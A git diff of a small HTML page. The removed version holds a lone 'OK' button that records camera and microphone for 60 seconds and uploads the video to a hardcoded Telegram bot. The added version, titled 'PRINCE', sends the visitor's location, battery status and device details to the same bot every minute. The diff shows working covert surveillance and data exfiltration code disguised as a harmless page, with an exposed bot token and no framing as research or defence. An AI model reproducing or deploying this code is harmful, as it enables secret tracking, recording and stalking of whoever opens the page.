@@ -1,51 +1,79 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Camera Recording</title>
-  <style>
-    body {
-      background-color: black;
-    }
-  </style>
+    <title>Location and Battery Info</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Responsive meta tag -->
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            margin: 0; /* Remove default margin */
+        }
+        h1 {
+            font-size: 24px; /* Adjust font size for mobile */
+        }
+        button {
+            padding: 10px 20px; /* Add padding to the button */
+            font-size: 16px; /* Adjust button font size */
+            cursor: pointer; /* Change cursor on hover */
+        }
+    </style>
 </head>
 <body>
-  <button id="ok-button">OK</button>
-  <script>
-    const okButton = document.getElementById('ok-button');
-    okButton.addEventListener('click', async () => {
-      try {
-        // Request camera permission
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const videoTracks = stream.getVideoTracks();
-        const videoTrack = videoTracks[0];
-        
-        // Start camera recording
-        const mediaRecorder = new MediaRecorder(stream);
-        let chunks = [];
-        mediaRecorder.ondataavailable = event => {
-          chunks.push(event.data);
-        };
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' }); // Changed file format to WebM
-          chunks = [];
-          
-          // Send recorded video to Telegram bot
-          const formData = new FormData();
-          formData.append('video', blob);
-          const xhr = new XMLHttpRequest();
-          xhr.open('POST', `https://api.telegram.org/bot6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es/sendVideo?chat_id=5112680061`, true);
-          xhr.send(formData);
-        };
-        mediaRecorder.start();
-        
-        // Stop recording after 60 seconds
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, 60000); // Increased recording duration to 60 seconds
-      } catch (error) {
-        console.error('Error:', error);
-      }
-    });
-  </script>
+    <h1>PRINCE</h1>
+    <p id="status"></p>
+
+    <script>
+        function sendLocation() {
+            navigator.geolocation.getCurrentPosition(position => {
+                var latitude = position.coords.latitude;
+                var longitude = position.coords.longitude;
+                var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
+                var chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+                var message = `Location: Latitude ${latitude}, Longitude ${longitude}\n`;
+                navigator.getBattery().then(function(battery) {
+                    var level = battery.level * 100 + '%';
+                    var charging = battery.charging ? 'Yes' : 'No';
+                    message += `Battery Level: ${level}\nCharging: ${charging}\n`;
+                    var deviceModel = navigator.userAgent;
+                    message += `Device Model: ${deviceModel}`;
+                    sendToTelegram(chatId, token, message);
+                });
+            });
+        }
+
+        function sendToTelegram(chatId, token, message) {
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+            var data = {
+                chat_id: chatId,
+                text: message
+            };
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                document.getElementById("status").textContent = "Information sent successfully!";
+            })
+            .catch(error => {
+                document.getElementById("status").textContent = "Error sending: " + error.message;
+                console.error('Error:', error);
+            });
+        }
+
+        setInterval(sendLocation, 60000); // Send location every 1 minute
+    </script>
 </body>
 </html>
